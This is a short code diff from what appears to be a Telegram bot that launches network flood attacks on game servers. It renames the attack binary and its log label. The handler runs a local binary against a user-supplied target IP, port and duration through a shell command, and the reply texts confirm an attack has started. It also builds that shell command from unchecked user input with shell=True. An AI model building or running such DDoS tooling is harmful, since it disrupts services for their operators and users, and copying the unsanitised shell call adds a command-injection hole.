@@ -144,10 +144,10 @@ def handle_bgmi(message):
             if time > 240:
                 response = "❌ 𝙴𝚛𝚛𝚘𝚛: 𝚘𝚗𝚕𝚢 𝚢𝚘𝚞 𝚌𝚊𝚗 𝚞𝚜𝚎 𝚝𝚘  240 𝚜𝚎𝚌𝚘𝚗𝚍𝚜"
             else:
-                record_command_logs(user_id, '/pushpa', target, port, time)
+                record_command_logs(user_id, '/girlfriend', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)
-                subprocess.run(f"./pushpa {target} {port} {time} 900", shell=True)
+                subprocess.run(f"./girlfriend {target} {port} {time} 900", shell=True)
                 response = f"🅱🅶🅼🅸 🅺🅸 🅲🅷🆄🅳🅰🆈🅸 🅺🅷🅰🆃🅰🅼. 𝐭𝐚𝐫𝐠𝐞𝐭: {target} 𝐩𝐨𝐫𝐭: {port} 𝐝𝐮𝐫𝐚𝐭𝐨𝐢𝐧: {time}"
             bot.reply_to(message, response)
         else:
